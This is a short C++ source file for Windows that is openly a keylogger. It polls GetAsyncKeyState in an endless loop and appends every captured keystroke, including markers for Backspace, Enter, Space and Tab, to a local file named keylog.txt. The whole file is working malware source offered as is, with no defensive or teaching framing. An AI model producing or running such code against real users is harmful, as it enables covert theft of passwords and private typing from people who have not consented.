#ifdef _WIN32
#include <iostream>
#include <fstream>
#include <windows.h>

void logKey(std::ofstream& logfile, char key) {
    switch (key) {
        case VK_BACK: logfile << "[BACKSPACE]"; break;
        case VK_RETURN: logfile << "[ENTER]"; break;
        case VK_SPACE: logfile << "[SPACE]"; break;
        case VK_TAB: logfile << "[TAB]"; break;
        default: logfile << key; break;
    }
    logfile.flush(); // Asigură că datele sunt scrise imediat în fișier
}

void keylogger() {
    std::ofstream logfile("keylog.txt", std::ios::app);
    if (!logfile.is_open()) {
        std::cerr << "Failed to open keylog.txt" << std::endl;
        return;
    }

    char key;
    while (true) {
        for (key = 8; key <= 222; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(logfile, key);
            }
        }
        Sleep(10); // Reduce CPU usage
    }
}

int main() {
    keylogger();
    return 0;
}
#endif
